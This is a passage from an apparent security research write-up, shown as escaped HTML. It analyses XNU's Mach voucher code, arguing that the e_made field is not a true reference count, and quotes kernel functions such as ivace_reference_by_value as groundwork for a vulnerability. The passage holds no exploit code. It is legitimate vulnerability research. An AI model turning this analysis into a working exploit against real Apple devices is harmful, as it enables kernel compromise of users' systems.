 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;is critical to the vulnerability we&amp;#39;re eventually going to discuss, so let&amp;#39;s examine its use here.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;If a new &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;is created its &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is initialized to 1. If an existing &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;is found which matches the requested content buffer the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is incremented before a pointer to that &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;is returned. Redeeming a &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;(via the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;command) also just increments the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the element being redeemed before returning it. The type of the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;mach_voucher_attr_value_reference_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;so it&amp;#39;s tempting to believe that this field is a reference count. The reality is more subtle than that though.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;The first hint that &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t exactly a reference count is that if you search for &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;in XNU you&amp;#39;ll notice that it&amp;#39;s never decremented. There are also no places where a pointer to that structure is cast to another type which treats the first dword as a reference count. &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;can only ever go up (well technically there&amp;#39;s also nothing stopping it overflowing so it can also go down 1 in every 2&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c28&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;increments...)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Let&amp;#39;s go back up the stack to the caller of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_get_value&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ipc_replace_voucher_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;The next part is again code for unused functionality. No current voucher attr type implementations return a &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;new_value_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;so this condition is never true:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.4f6b8727516fb3c9c48ebff520ad8874f31f22d6&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.30&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* TODO: value insertion from returned voucher */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;IV_NULL &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;new_value_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_release&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_value_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Next, the code needs to wrap &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;new_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;in an &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;and determine the index of that &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the controller&amp;#39;s table of values. This is done by &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_reference_by_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.c4c5981b6f20ec9de21a50072140d8a412c4cbbe&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.31&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Find or create a slot in the table associated&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* with this attribute value. &amp;nbsp;The ivac reference&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* is transferred to a new value, or consumed if&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* we find a matching existing value.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; val_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace_reference_by_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;new_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;new_flag&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_set&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;val_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.14867f48cf979ee62c6fdccbefa3859e7dda3ebe&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.32&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp;* Look up the values for a given &amp;lt;key, index&amp;gt; pair.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp;*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp;* Consumes a reference on the passed voucher control.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp;* Either it is donated to a newly-created value cache&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp;* or it is released (if we piggy back on an existing&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp;* value cache entry).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;iv_index_t&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_reference_by_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_control_t &amp;nbsp; &amp;nbsp; &amp;nbsp;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_flags_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;flag&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_entry_t ivace &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;IVACE_NULL&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t hash_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;IVAC_NULL &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;IV_UNUSED_VALINDEX&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;restart&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hash_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;IV_HASH_VAL&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_init_table_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;hash_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;IV_HASH_END&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_free&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
